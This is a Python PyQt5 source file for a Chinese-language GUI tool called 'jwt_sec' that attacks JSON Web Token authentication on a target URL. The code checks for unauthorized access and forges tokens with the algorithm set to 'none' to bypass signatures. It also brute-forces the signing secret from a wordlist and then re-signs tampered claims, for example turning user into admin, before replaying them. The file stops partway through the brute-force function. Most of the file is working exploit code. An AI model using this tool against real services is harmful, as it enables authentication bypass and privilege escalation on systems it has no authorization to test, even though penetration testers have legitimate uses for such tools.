import sys,re,jwt,json,base64,requests,os
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QLineEdit, QPushButton, QVBoxLayout, QHBoxLayout, QTextEdit, QComboBox, QTableWidget, QHeaderView, QFileDialog, QAbstractItemView, QMessageBox,QTableWidgetItem
from PyQt5.QtGui import QIcon,QColor
from PyQt5.QtGui import QKeySequence

class MyWindow(QWidget):
    def __init__(self):
        super().__init__()

        self.resize(1200,900)
        self.setWindowTitle("jwt_sec 0.1 ——by 清晨")
        self.setWindowIcon(QIcon("nice.png"))
        self.init_ui()

    def init_ui(self):
        self.v_layout = QVBoxLayout()

        # URL部分
        self.iv_layout1 = QHBoxLayout()
        self.url_lable = QLabel("地址（URL）：")
        self.url_edit = QLineEdit()
        self.url_edit.setPlaceholderText("请输入测试的URL（有get参数，url中需要携带参数）。")
        self.http_porxy_lable = QLabel("HTTP代理：")
        self.http_porxy_edit = QLineEdit()
        self.http_porxy_edit.setPlaceholderText("设置http的代理，如：http://127.0.0.1:8080")
        # self.http_porxy_edit.setText('http://127.0.0.1:8080')
        self.method_box = QComboBox()
        self.method_box.addItem("GET")
        self.method_box.addItem("POST")
        self.but = QPushButton("开始测试")
        self.iv_layout1.addWidget(self.url_lable)
        self.iv_layout1.addWidget(self.url_edit)
        self.iv_layout1.addWidget(self.http_porxy_lable)
        self.iv_layout1.addWidget(self.http_porxy_edit)
        self.iv_layout1.addWidget(self.method_box)
        self.iv_layout1.addWidget(self.but)
        self.but.clicked.connect(self.run_check)

        # 指定key部分
        self.iv_layout7 = QHBoxLayout()
        self.dic_lable = QLabel("字典路径：")
        self.dic_file_path = QLineEdit()
        self.dic_file_path.setText("jwt.secrets.list")
        self.file_bt = QPushButton('选择字典')
        self.key_lable = QLabel("指定key：")
        self.key_edit = QLineEdit()

        self.iv_layout7.addWidget(self.dic_lable)
        self.iv_layout7.addWidget(self.dic_file_path)
        self.iv_layout7.addWidget(self.file_bt)
        self.iv_layout7.addWidget(self.key_lable)
        self.iv_layout7.addWidget(self.key_edit)
        self.file_bt.clicked.connect(self.Select_a_single_file)

        # JWT部分
        self.iv_layout2 = QHBoxLayout()
        self.jwt_send_lable = QLabel("JWT的位置：")
        self.jwt_send_box = QComboBox()
        self.jwt_send_box.addItem("Header头")
        self.jwt_send_box.addItem("GET参数")
        self.jwt_send_box.addItem("POST参数")
        self.jwt_lable = QLabel("JWT：")
        self.jwt_txt = QTextEdit()
        self.jwt_txt.setFixedHeight(100)
        self.jwt_txt.setPlaceholderText("1.如果header头的，需要填写完整，如：Authorization: Bearer eyJ0exxx.xxx.xxx\n2.在header头，再如：Token: eyJ0exxx.xxx.xxx\n3.如果在参数里的，类似（xxx/?uid=xxx&token=eyJ0exxx.xxx.xxx），需要填入：token=eyJ0exxx.xxx.xxx\n4.如果jwt在post请求体里的json数据中，请填写整个json请求体（否则无法识别jwt），下面的请求体部分则可以不填。")
        # self.setMouseTracking(True)
        self.jwt_txt.textChanged.connect(self.get_jwt_payload)
        self.iv_layout2.addWidget(self.jwt_send_lable)
        self.iv_layout2.addWidget(self.jwt_send_box)
        self.iv_layout2.addWidget(self.jwt_lable)
        self.iv_layout2.addWidget(self.jwt_txt)

        # 替换部分
        self.jwt_lable1 = QLabel("把JWT中:")
        self.iv_layout6 = QHBoxLayout()
        self.old_str = QTextEdit()
        self.old_str.setFixedHeight(100)
        self.old_str.setPlaceholderText("如：user")
        self.jwt_lable2 = QLabel("替换成:")
        self.new_str = QTextEdit()
        self.new_str.setFixedHeight(100)
        self.new_str.setPlaceholderText("如：admin")
        self.iv_layout6.addWidget(self.jwt_lable1)
        self.iv_layout6.addWidget(self.old_str)
        self.iv_layout6.addWidget(self.jwt_lable2)
        self.iv_layout6.addWidget(self.new_str)

        # 请求头和请求体部分。
        self.iv_layout3 = QHBoxLayout()
        self.header_lable = QLabel("请求头：")
        self.header_txt = QTextEdit()
        self.header_txt.setFixedHeight(100)
        self.header_txt.setPlaceholderText("填写其他请求头，如：Content-Type: application/json等等。")
        self.header_txt.setText("Content-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198\nConnection: close")
        self.data_lable = QLabel("请求体：")
        self.data_txt = QTextEdit()
        self.data_txt.setFixedHeight(100)
        self.data_txt.setPlaceholderText("如果是POST请求，且有其他请求参数填这里。")
        self.iv_layout3.addWidget(self.header_lable)
        self.iv_layout3.addWidget(self.header_txt)
        self.iv_layout3.addWidget(self.data_lable)
        self.iv_layout3.addWidget(self.data_txt)

        # 测试结果展现部分
        self.iv_layout4 = QHBoxLayout()
        # 创建表格和表头
        self.tableWidget = QTableWidget(self)
        self.tableWidget.setRowCount(5)  # 设置行数
        self.tableWidget.setColumnCount(5)  # 设置列数
        # 设置表头
        self.tableWidget.setHorizontalHeaderLabels(["测试点", "响应状态码", "响应包大小", "测试结果", "说明"])
        self.header = self.tableWidget.horizontalHeader()
        self.header.setSectionResizeMode(QHeaderView.Interactive)
        self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.tableWidget.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.tableWidget.setColumnWidth(0, 150)  # 设置第1列的宽度为100
        self.tableWidget.setColumnWidth(1, 100)  # 设置第2列的宽度为150
        self.tableWidget.setColumnWidth(2, 100)  # 设置第3列的宽度为50
        self.tableWidget.setColumnWidth(3, 180)  # 设置第4列的宽度为200
        self.tableWidget.setColumnWidth(4, 600)  # 设置第5列的宽度为100
        self.tableWidget.itemClicked.connect(self.print_data)
        self.iv_layout4.addWidget(self.tableWidget)

        # 显示请求包和响应包
        self.iv_layout5 = QHBoxLayout()
        self.req_txt = QTextEdit()
        self.req_txt.setPlaceholderText("这里显示请求包。")
        self.req_txt.setFixedHeight(300)
        self.rep_txt = QTextEdit()
        self.rep_txt.setPlaceholderText("这里显示响应包。")
        self.rep_txt.setFixedHeight(300)
        self.iv_layout5.addWidget(self.req_txt)
        self.iv_layout5.addWidget(self.rep_txt)

        self.v_layout.addLayout(self.iv_layout1)
        self.v_layout.addLayout(self.iv_layout7)
        self.v_layout.addLayout(self.iv_layout2)
        self.v_layout.addLayout(self.iv_layout6)
        self.v_layout.addLayout(self.iv_layout3)
        self.v_layout.addLayout(self.iv_layout4)
        self.v_layout.addLayout(self.iv_layout5)
        self.setLayout(self.v_layout)

    def get_jwt_payload(self):
        jwt_str = self.get_jwt()
        if jwt_str:
            jwt_payload_base64 = jwt_str.split('.')[1]
            print('jwt_payload_base64 is :',jwt_payload_base64)
            jwt_payload_base64 = jwt_payload_base64.replace('_','/')
            jwt_payload_base64 = jwt_payload_base64.replace('-', '+')
            try:
                jwt_payload = base64.b64decode(jwt_payload_base64).decode('utf-8')
            except Exception as e:
                try:
                    # 补齐base64缺少1个=号的情况。
                    jwt_payload = base64.b64decode(jwt_payload_base64 + "=").decode('utf-8')
                except Exception as ee:
                    # 补齐base64缺少2个=号的情况。
                    jwt_payload = base64.b64decode(jwt_payload_base64 + "==").decode('utf-8')
            self.jwt_payload = jwt_payload
            self.old_str.setText(jwt_payload)
        else:
            self.old_str.setText('')


    def Select_a_single_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "选择文件", "", "All Files (*)")
        if file_path:
            self.dic_file_path.setText(file_path)

    def run_check(self):
        self.sec_result = []
        # 获取请求方式
        self.mothd = self.method_box.currentText()
        # print("请求方式：",self.method_box.currentText())
        # 获取jwt的位置
        self.jwt_position = self.jwt_send_box.currentText()
        # 获取jwt的位置
        self.proxy = {'http':self.http_porxy_edit.text(),'https':self.http_porxy_edit.text()}
        # 获取请求头
        self.get_headers()

        # 获取请求体
        # print("请求体：", self.data_txt.toPlainText())
        self.post_data = self.data_txt.toPlainText()

        jwt_str = self.get_jwt()
        if jwt_str:
            # 获取URL
            self.url = self.url_edit.text()
            if (not self.url.startswith('http://')) and (not self.url.startswith('https://')):
                QMessageBox.warning(self, '警告', '您输入的URL格式不正确（URL格式：https://www.xxx.com?a=123&b=test）。')
            # print("请求URL：", self.url_edit.text())
            else:
                # 存在jwt，进行jwt漏洞处理
                # self.check_none()
                self.jwt_vul(jwt_str)
                for row in self.sec_result:
                    self.tableWidget.setItem(row['test_id'],0,QTableWidgetItem(row['test_title']))
                    self.tableWidget.setItem(row['test_id'], 1, QTableWidgetItem(str(row['status_code'])))
                    self.tableWidget.setItem(row['test_id'], 2, QTableWidgetItem(str(row['rep_length'])))
                    if row['sec_flag'] == False:
                        itme = QTableWidgetItem(row['test_result'])
                        itme.setBackground(QColor('red'))
                    else:
                        itme = QTableWidgetItem(row['test_result'])
                    self.tableWidget.setItem(row['test_id'], 3, itme)
                    self.tableWidget.setItem(row['test_id'], 4, QTableWidgetItem(row['description']))
                # self.tableWidget.resizeColumnsToContents()
        else:
            QMessageBox.warning(self, '警告', '您未输入正确的jwt，请核对！')

    def get_headers(self):
        # 获取headers头
        headers_tmp = self.header_txt.toPlainText()
        # 去除多余的换行
        headers_tmp = headers_tmp.strip().split('\n')
        # print(headers_tmp)
        headers_name = []
        headers_value = []
        for i in headers_tmp:
            # 只分割一次，排除字段值中带有:的错误。
            tmp = i.split(':', 1)
            headers_name.append(tmp[0].strip())
            headers_value.append(tmp[1].strip())
        self.headers = dict(zip(headers_name, headers_value))
        # print(headers)

    def get_jwt(self):
        all_jwt = self.jwt_txt.toPlainText()
        re_jwt = r"[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+"
        if re.search(re_jwt,all_jwt):
            return re.search(re_jwt,all_jwt).group()
        else:
            return False

    def jwt_vul(self,jwt_str):
        jwt_header_base64 = jwt_str.split('.')[0]
        jwt_header_base64 = jwt_header_base64.replace('_', '/')
        jwt_header_base64 = jwt_header_base64.replace('-', '+')
        try:
            jwt_header = json.loads(base64.b64decode(jwt_header_base64))
        except Exception as e:
            try:
                # 补齐base64缺少1个=号的情况。
                jwt_header = json.loads(base64.b64decode(jwt_header_base64 + "="))
            except Exception as ee:
                # 补齐base64缺少2个=号的情况。
                jwt_header = json.loads(base64.b64decode(jwt_header_base64 + "=="))
        try:
            self.alg = jwt_header['alg']
        except Exception as alge:
            print('jwt中未申明alg加密算法，alg将被设置为：HS256')
            self.alg = "HS256"

        # 把alg改成none
        jwt_header['alg'] = 'none'
        payload1 = base64.b64encode(json.dumps(jwt_header).encode('utf-8')).decode('utf-8') + '.' + jwt_str.split('.')[1] + '.'

        none = self.check_none(payload1)
        # 原始请求401，将不会继续执行。
        if none:
            brutes = self.brute(jwt_str)
            # self.get_jwt_payload()
            jwt_payload_base64 = jwt_str.split('.')[1]
            jwt_payload_base64 = jwt_payload_base64.replace('_','/')
            jwt_payload_base64 = jwt_payload_base64.replace('-', '+')
            try:
                jwt_payload1 = base64.b64decode(jwt_payload_base64).decode('utf-8')
            except Exception as e:
                try:
                    # 补齐base64缺少1个=号的情况。
                    jwt_payload1 = base64.b64decode(jwt_payload_base64 + "=").decode('utf-8')
                except Exception as ee:
                    # 补齐base64缺少2个=号的情况。
                    jwt_payload1 = base64.b64decode(jwt_payload_base64 + "==").decode('utf-8')
            try:
                if self.new_str.toPlainText():
                    print("替换前内容：",jwt_payload1)
                    print("要替换的内容：", self.new_str.toPlainText())
                    replace_payload = jwt_payload1.replace(self.old_str.toPlainText(),self.new_str.toPlainText())
                    print("替换后内容：", replace_payload)
                else:
                    return False
                if brutes:
                    # 生成新的jwt
                    replace_jwt = jwt.encode(json.loads(replace_payload),self.jwt_key,algorithm=self.alg)

                # 如果爆破不成功，但是存在none空漏洞，也可以替换请求。
                elif self.sec_result[2]['sec_flag'] == False:
                    jwt_payload = base64.b64encode(json.loads(replace_payload).encode('utf-8')).decode('utf-8').replace('=','')
                    jwt_payload = jwt_payload.replace('/','_')
                    jwt_payload = jwt_payload.replace('+', '-')
                    replace_jwt = base64.b64encode(json.dumps(jwt_header).encode('utf-8')).decode('utf-8') + '.' + jwt_payload + '.'
                else:
                    return False
                # print(replace_jwt)
                # 如果在请求头中，就替换请求头
                if self.jwt_position == "Header头":
                    jwt_dic = self.jwt_txt.toPlainText().split(':', 1)
                    tmp_headers = self.headers.copy()
                    tmp_headers[jwt_dic[0].strip()] = jwt_dic[1].strip().replace(self.get_jwt(),replace_jwt)
                    # 判断是GET还是POST请求。
                    if self.mothd == "GET":
                        rep5 = requests.get(self.url, headers=tmp_headers, proxies=self.proxy, allow_redirects=False)
                    else:
                        # 判断是json数据还是普通post数据。
                        if self.post_data.startswith("{"):
                            post_tmp = json.loads(self.post_data)
                            rep5 = requests.post(self.url, headers=tmp_headers, json=post_tmp,
                                                 proxies=self.proxy, allow_redirects=False)
                        else:
                            rep5 = requests.post(self.url, headers=tmp_headers, data=self.post_data,
                                                 proxies=self.proxy, allow_redirects=False)
                # 如果在请求体中，就替换请求体
                else:
                    jwt_tmp_list = self.jwt_txt.toPlainText().split('=', 1)
                    if self.jwt_position == "GET参数":
                        # 判断url中是否携带jwt的参数。
                        if jwt_tmp_list[0] + '=' in self.url:
                            tmp_url5 = self.url.replace(jwt_tmp_list[0] + '=', jwt_tmp_list[0] + '=' + replace_jwt)
                        elif re.search(r'\?.+=',self.url):
                            tmp_url5 = self.url + "&" + jwt_tmp_list[0] + '=' + replace_jwt
                        else:
                            tmp_url5 = self.url + "?" + jwt_tmp_list[0] + '=' + replace_jwt
                        # 判断是GET还是POST请求。
                        if self.mothd == "GET":
                            rep5 = requests.get(tmp_url5, headers=self.headers, proxies=self.proxy, allow_redirects=False)
                        else:
                            # 判断是json数据还是普通post数据。
                            if self.post_data.startswith("{"):
                                post_tmp = json.loads(self.post_data)
                                rep5 = requests.post(tmp_url5, headers=self.headers, json=post_tmp,
                                                     proxies=self.proxy, allow_redirects=False)
                            else:

                                rep5 = requests.post(tmp_url5, headers=self.headers, data=self.post_data.strip(),
                                                     proxies=self.proxy, allow_redirects=False)
                    else:
                        # 判断是json数据还是普通post数据。
                        if self.jwt_txt.toPlainText().startswith("{"):
                            tmp_data5 = json.loads(self.jwt_txt.toPlainText().replace(self.get_jwt(), replace_jwt))
                            rep5 = requests.post(self.url, headers=self.headers, json=tmp_data5, proxies=self.proxy, allow_redirects=False)
                        else:
                            if jwt_tmp_list[0] + '=' in self.post_data:
                                tmp_data5 = self.post_data.strip().replace(jwt_tmp_list[0] + '=',
                                                                           jwt_tmp_list[0] + '=' + replace_jwt)
                                rep5 = requests.post(self.url, headers=self.headers, data=tmp_data5,
                                                     proxies=self.proxy, allow_redirects=False)
                            elif self.post_data:
                                tmp_data5 = self.post_data.strip() + '&' + jwt_tmp_list[0] + '=' + replace_jwt
                                rep5 = requests.post(self.url, headers=self.headers, data=tmp_data5,
                                                     proxies=self.proxy, allow_redirects=False)
                            else:
                                tmp_data5 = self.post_data.strip() + jwt_tmp_list[0] + '=' + replace_jwt
                                rep5 = requests.post(self.url, headers=self.headers, data=tmp_data5,
                                                     proxies=self.proxy, allow_redirects=False)
                self.sec_result.append(
                    {'test_id': 4, 'test_title': '替换jwt后的请求', 'status_code': rep5.status_code, 'rep_length': len(rep5.text),
                     'test_result': '无', 'description': '这是替换jwt后的请求。',
                     'req_data': self.print_raw(rep5.request.__dict__, 'req'),
                     'rep_data': self.print_raw(rep5.__dict__, 'rep'), 'sec_flag': True})
            except Exception as e:
                print(e)

    def print_data(self,item=None):
        if item == None:
            return
        else:
            row = item.row()
            if row > len(self.sec_result)-1:
                self.req_txt.setText('')
                self.rep_txt.setText('')
            else:
                self.req_txt.setText(self.sec_result[row]['req_data'])
                self.rep_txt.setText(self.sec_result[row]['rep_data'])

    def check_none(self,payload1):
        # 如果在请求头中，就替换请求头
        if self.jwt_position == "Header头":
            try:
                jwt_dic = self.jwt_txt.toPlainText().split(':', 1)
                # 原始请求头
                tmp_headers = self.headers.copy()
                tmp_headers[jwt_dic[0].strip()] = jwt_dic[1].strip()
                # 未授权请求头
                tmp_headers1 = self.headers.copy()
                tmp_headers1[jwt_dic[0]] = jwt_dic[1].strip().replace(self.get_jwt(),'aaaaaaaaaaaa')

                # none请求头
                tmp_headers2 = self.headers.copy()
                tmp_headers2[jwt_dic[0]] = jwt_dic[1].strip().replace(self.get_jwt(),payload1)

                # 判断是GET还是POST请求。
                if self.mothd == "GET":
                    # 原始请求。
                    rep1 = requests.get(self.url, headers=tmp_headers,proxies=self.proxy, allow_redirects=False)
                    # 未授权请求。
                    rep2 = requests.get(self.url, headers=tmp_headers1,proxies=self.proxy, allow_redirects=False)
                    # nonejwt请求。
                    rep3 = requests.get(self.url, headers=tmp_headers2, proxies=self.proxy, allow_redirects=False)
                else:
                    # 判断是json数据还是普通post数据。
                    if self.post_data.startswith("{"):
                        post_tmp = json.loads(self.post_data)
                        # print(post_tmp)
                        # 原始请求。
                        rep1 = requests.post(self.url, headers=tmp_headers, json=post_tmp,proxies=self.proxy, allow_redirects=False)
                        # 未授权请求。
                        rep2 = requests.post(self.url, headers=tmp_headers1, json=post_tmp,proxies=self.proxy, allow_redirects=False)
                        # none请求。
                        rep3 = requests.post(self.url, headers=tmp_headers2, json=post_tmp, proxies=self.proxy, allow_redirects=False)
                    else:
                        # 原始请求。
                        rep1 = requests.post(self.url, headers=tmp_headers, data=self.post_data,proxies=self.proxy, allow_redirects=False)
                        # 未授权请求。
                        rep2 = requests.post(self.url, headers=tmp_headers1, data=self.post_data,proxies=self.proxy, allow_redirects=False)
                        # none请求。
                        rep3 = requests.post(self.url, headers=tmp_headers2, data=self.post_data, proxies=self.proxy, allow_redirects=False)
            except Exception as e:
                print(e)
                QMessageBox.warning(self, '警告', '处理header部分jwt出错！')

        # 如果在请求体中，就替换请求体
        else:
            jwt_tmp_list = self.jwt_txt.toPlainText().split('=', 1)
            if self.jwt_position == "GET参数":
                # 判断url中是否携带jwt的参数。
                if jwt_tmp_list[0] +'=' in self.url:
                    # 原始请求url
                    tmp_url = self.url.replace(jwt_tmp_list[0] +'=', self.jwt_txt.toPlainText())
                    # 未授权请求url
                    tmp_url1 = self.url.replace(jwt_tmp_list[0] + '=',jwt_tmp_list[0] + '=aaaaaaaaaaaa')
                    # none请求url
                    tmp_url2 = self.url.replace(jwt_tmp_list[0] + '=', jwt_tmp_list[0] + '=' + payload1)
                elif re.search(r'\?.+=', self.url):
                    # 原始请求url
                    tmp_url = self.url + "&" + self.jwt_txt.toPlainText()
                    # 未授权请求url
                    tmp_url1 = self.url + "&" + jwt_tmp_list[0] + '=aaaaaaaaaaaa'
                    # none请求url
                    tmp_url2 = self.url + "&" + jwt_tmp_list[0] + '=' + payload1
                else:
                    # 原始请求url
                    tmp_url = self.url + "?" + self.jwt_txt.toPlainText()
                    # 未授权请求url
                    tmp_url1 = self.url + "?" + jwt_tmp_list[0] + '=aaaaaaaaaaaa'
                    # none请求url
                    tmp_url2 = self.url + "?" + jwt_tmp_list[0] + '=' + payload1
                # 判断是GET还是POST请求。
                if self.mothd == "GET":
                    # 原始请求。
                    rep1 = requests.get(tmp_url, headers=self.headers,proxies=self.proxy, allow_redirects=False)
                    # 未授权请求。
                    rep2 = requests.get(tmp_url1, headers=self.headers,proxies=self.proxy, allow_redirects=False)
                    # none请求。
                    rep3 = requests.get(tmp_url2, headers=self.headers, proxies=self.proxy, allow_redirects=False)
                else:
                    # 判断是json数据还是普通post数据。
                    if self.post_data.startswith("{"):
                        post_tmp = json.loads(self.post_data)
                        # 原始请求。
                        rep1 = requests.post(tmp_url, headers=self.headers, json=post_tmp,proxies=self.proxy, allow_redirects=False)
                        # 未授权请求。
                        rep2 = requests.post(tmp_url1, headers=self.headers, json=post_tmp,proxies=self.proxy, allow_redirects=False)
                        # none请求
                        rep3 = requests.post(tmp_url2, headers=self.headers, json=post_tmp, proxies=self.proxy, allow_redirects=False)
                        # rep4 = requests.post(tmp_url3, headers=self.headers, json=post_tmp, proxies=self.proxy)
                    else:
                        # 原始请求。
                        rep1 = requests.post(tmp_url, headers=self.headers, data=self.post_data.strip(),proxies=self.proxy, allow_redirects=False)
                        # 未授权请求。
                        rep2 = requests.post(tmp_url1, headers=self.headers, data=self.post_data.strip(),proxies=self.proxy, allow_redirects=False)
                        # none请求
                        rep3 = requests.post(tmp_url2, headers=self.headers, data=self.post_data.strip(),
                                             proxies=self.proxy, allow_redirects=False)
            else:
                # 判断是json数据还是普通post数据。
                if self.jwt_txt.toPlainText().startswith("{"):
                    post_tmp = json.loads(self.jwt_txt.toPlainText())
                    # 原始请求。
                    rep1 = requests.post(self.url,headers=self.headers,json=post_tmp,proxies=self.proxy, allow_redirects=False)
                    # 未授权请求
                    tmp_data = json.loads(self.jwt_txt.toPlainText().replace(self.get_jwt(),'aaaaaaaaaaa'))
                    rep2 = requests.post(self.url,headers=self.headers,json=tmp_data,proxies=self.proxy, allow_redirects=False)
                    # none请求
                    tmp_data1 = json.loads(self.jwt_txt.toPlainText().replace(self.get_jwt(), payload1))
                    rep3 = requests.post(self.url, headers=self.headers, json=tmp_data1, proxies=self.proxy, allow_redirects=False)

                else:
                    if jwt_tmp_list[0] +'=' in self.post_data:
                        # 原始请求。
                        tmp_data = self.post_data.strip().replace(jwt_tmp_list[0] +'=', self.jwt_txt.toPlainText())
                        rep1 = requests.post(self.url, headers=self.headers, data=tmp_data,proxies=self.proxy, allow_redirects=False)
                        # 未授权请求
                        tmp_data = self.post_data.strip().replace(jwt_tmp_list[0] + '=', jwt_tmp_list[0] + '=aaaaaaaaaaa')
                        rep2 = requests.post(self.url, headers=self.headers, data=tmp_data,proxies=self.proxy, allow_redirects=False)
                        # none请求
                        tmp_data1 = self.post_data.strip().replace(jwt_tmp_list[0] + '=',
                                                                  jwt_tmp_list[0] + '=' + payload1)
                        rep3 = requests.post(self.url, headers=self.headers, data=tmp_data1, proxies=self.proxy, allow_redirects=False)

                    elif self.post_data:
                        # 原始请求。
                        tmp_data = self.post_data.strip() + '&' + self.jwt_txt.toPlainText()
                        rep1 = requests.post(self.url, headers=self.headers, data=tmp_data, proxies=self.proxy, allow_redirects=False)
                        # 未授权请求
                        tmp_data = self.post_data.strip() + '&' + jwt_tmp_list[0] + '=aaaaaaaaaaa'
                        rep2 = requests.post(self.url, headers=self.headers, data=tmp_data, proxies=self.proxy, allow_redirects=False)
                        # none请求
                        tmp_data1 = self.post_data.strip() + '&' + jwt_tmp_list[0] + '=' + payload1
                        rep3 = requests.post(self.url, headers=self.headers, data=tmp_data1, proxies=self.proxy, allow_redirects=False)
                    else:
                        # 原始请求。
                        tmp_data = self.post_data.strip() + self.jwt_txt.toPlainText()
                        rep1 = requests.post(self.url, headers=self.headers, data=tmp_data, proxies=self.proxy, allow_redirects=False)
                        # 未授权请求
                        tmp_data = self.post_data.strip() + jwt_tmp_list[0] + '=aaaaaaaaaaa'
                        rep2 = requests.post(self.url, headers=self.headers, data=tmp_data, proxies=self.proxy, allow_redirects=False)
                        # none请求
                        tmp_data1 = self.post_data.strip() + jwt_tmp_list[0] + '=' + payload1
                        rep3 = requests.post(self.url, headers=self.headers, data=tmp_data1, proxies=self.proxy, allow_redirects=False)

        self.sec_result.append({'test_id':0,'test_title':'原始请求','status_code': rep1.status_code,'rep_length':len(rep1.text),'test_result':'无','description':'这是原始请求。','req_data':self.print_raw(rep1.request.__dict__,'req'),'rep_data':self.print_raw(rep1.__dict__,'rep'),'sec_flag':True})

        if rep1.status_code == 401:
            QMessageBox.warning(self, '警告', '搞个屁呢大哥？原始请求都是401！')
            return False
        elif rep1.status_code == 404:
            QMessageBox.warning(self, '警告', '搞个屁呢大哥？原始请求都是404！')
            return False

        # 判断是否存在未授权访问。
        if rep1.status_code == 200:
            if rep2.status_code == 401:
                un_sec_flag = True
                rep2_result = "不存在未授权访问漏洞"
                rep2_description = "原始请求状态码为200，未授权响应状态码为401，不存在未授权访问漏洞"
            elif rep2.status_code == 200:
                if len(rep1.text) == len(rep2.text):
                    un_sec_flag = False
                    rep2_result = "存在未授权访问漏洞"
                    rep2_description = "原始请求和未授权请求的响应包均为200，且响应包大小相等，很大概率存在未授权访问漏洞。"
                else:
                    un_sec_flag = True
                    rep2_result = "不存在未授权访问漏洞"
                    rep2_description = "原始请求和未授权请求的响应包均为200，但响应包大小不相等，不存在未授权访问漏洞。"
            else:
                un_sec_flag = True
                rep2_result = "不存在未授权访问漏洞"
                rep2_description = "原始请求状态码为200，未授权响应状态码不为200，不存在未授权访问漏洞"
        else:
            un_sec_flag = True
            rep2_result = "不做判断"
            rep2_description = "原始请求状态码不为200，判断结果将可能有误（如403、404、500等请求），因此不做判断。"

        self.sec_result.append(
            {'test_id':1,'test_title': '未授权访问测试', 'status_code': rep2.status_code, 'rep_length': len(rep2.text),
             'test_result': rep2_result,
             'description': rep2_description,'req_data':self.print_raw(rep2.request.__dict__,'req'),'rep_data':self.print_raw(rep2.__dict__,'rep'),'sec_flag':un_sec_flag})

        # 判断none请求。
        if un_sec_flag:
            if rep1.status_code == 200:
                if rep3.status_code == 401:
                    none_sec_flag = True
                    rep3_result = "不存在jwt空签名绕过漏洞"
                    rep3_description = "原始请求状态码为200，jwt空签名响应状态码为401，不存在jwt空签名绕过漏洞"
                    none_code = rep3.status_code
                    none_len = len(rep3.text)
                    none_req = self.print_raw(rep3.request.__dict__, 'req')
                    none_rep = self.print_raw(rep3.__dict__, 'rep')

                elif rep3.status_code == 200 and len(rep3.text) == len(rep1.text):
                    none_sec_flag = False
                    rep3_result = "存在jwt空签名绕过漏洞"
                    rep3_description = "jwt空签名绕过请求的响应状态码为200，且响应包大小与原始请求包相等，很大概率存在jwt空签名绕过漏洞。"
                    none_code = rep3.status_code
                    none_len = len(rep3.text)
                    none_req = self.print_raw(rep3.request.__dict__, 'req')
                    none_rep = self.print_raw(rep3.__dict__, 'rep')
                else:
                    none_sec_flag = True
                    rep3_result = "不存在jwt空签名绕过漏洞"
                    rep3_description = "jwt空签名请求的状态码不为200或且响应包大小与原始请求包不一致，不存在jwt空签名绕过漏洞"
                    none_code = rep3.status_code
                    none_len = len(rep3.text)
                    none_req = self.print_raw(rep3.request.__dict__, 'req')
                    none_rep = self.print_raw(rep3.__dict__, 'rep')
            else:
                none_sec_flag = True
                rep3_result = "不做判断"
                rep3_description = "原始请求状态码不为200，判断结果将可能有误（如403、404、500等请求），因此不做判断。"
                none_code = rep3.status_code
                none_len = len(rep3.text)
                none_req = self.print_raw(rep3.request.__dict__, 'req')
                none_rep = self.print_raw(rep3.__dict__, 'rep')
        else:
            none_sec_flag = True
            rep3_result = "不做判断"
            rep3_description = "因为存在未授权访问，因此不做判断。"
            none_code = rep3.status_code
            none_len = len(rep3.text)
            none_req = self.print_raw(rep3.request.__dict__, 'req')
            none_rep = self.print_raw(rep3.__dict__, 'rep')

        self.sec_result.append(
            {'test_id': 2, 'test_title': 'jwt空签名绕过测试', 'status_code': none_code, 'rep_length': none_len,
             'test_result': rep3_result,
             'description': rep3_description, 'req_data': none_req,
             'rep_data': none_rep, 'sec_flag': none_sec_flag})
        return True

    def print_raw(self, raw, type):
        print_str = ""
        if type == "req":
            url = '/'+re.sub(r'^http[s]?://.+\.[0-9a-zA-Z]+[:]?[1-6]?[0-9]?[0-9]?[0-9]?[0-9]?[/]','',raw['url'])
            ret = re.search(r'^http[s]?://(?P<host>.+\.[0-9a-zA-Z]+[:]?[1-6]?[0-9]?[0-9]?[0-9]?[0-9]?)[/]', raw['url'])
            host = ret.group('host')
            print_str += raw['method'] + " " + url + " HTTP/1.1\n"
            print_str += "Host: " + host + "\n"
            headers = raw['headers']
            for key, values in headers.items():
                print_str += key + ": " + values + "\n"
            if raw['body'] != None:
                if isinstance(raw['body'], bytes):
                    req_body = raw['body'].decode('utf-8')
                else:
                    req_body = raw['body']
                print_str += "\n" + str(req_body)
            else:
                print_str += "\n"
        elif type == "rep":
            print_str += "HTTP/1.1 " + str(raw['status_code']) + "\n"
            headers = raw['headers']
            for key, values in headers.items():
                print_str += key + ": " + values + "\n"
            print_str += "\n" + raw['_content'].decode('utf-8')
        return print_str


    def brute(self,jwt_str):
        brute_flag = False
        tmp_jwt = ""
        # 获取jwt的key
        jwt_dic_path = self.dic_file_path.text()
        jwt_key = self.key_edit.text()
        print('jwt签名算法：',self.alg)

        if jwt_key != "":
            print('已指定jwt的key，将使用指定的key进行测试。')
            try:
                jwt.decode(jwt_str, jwt_key, algorithms=[self.alg])
                brute_flag = True
                tmp_jwt = jwt_key
            except (jwt.ExpiredSignatureError, jwt.InvalidAudienceError,jwt.InvalidIssuedAtError,jwt.ImmatureSignatureError) as jerror:
                brute_flag = True
                tmp_jwt = jwt_key
            except Exception as eee:
                # 解决jjwt认证框架jwt解码bug
                try:
                    secret = base64.b64decode(jwt_key[:len(jwt_key) - (len(jwt_key) % 4)])
                    jwt.decode(jwt_str, secret, algorithms=[self.alg])
                    brute_flag = True
                    tmp_jwt = jwt_key
                except (jwt.ExpiredSignatureError, jwt.InvalidAudienceError, jwt.InvalidIssuedAtError,
                        jwt.ImmatureSignatureError) as jerror1:
                    brute_flag = True
                    tmp_jwt = jwt_key
                except Exception as eeee:
                    print(eeee)
                    QMessageBox.warning(self, '警告', '指定的jwt的key错误！建议删除指定的jwt的key，使用爆破的方式来对jwt进行爆破。')
        elif os.path.exists(jwt_dic_path):
            print('开始爆破')
            with open(jwt_dic_path,mode='r',encoding='utf-8') as keyfile:
                for tmp_key in keyfile:
                    try:
                        jwt.decode(jwt_str, tmp_key.replace('\n',''), algorithms=[self.alg])
                        brute_flag = True
                        tmp_jwt = tmp_key.replace('\n','')
                        break
                    except (jwt.ExpiredSignatureError, jwt.InvalidAudienceError, jwt.InvalidIssuedAtError,jwt.ImmatureSignatureError):
                        brute_flag = True
                        tmp_jwt = tmp_key.replace('\n','')
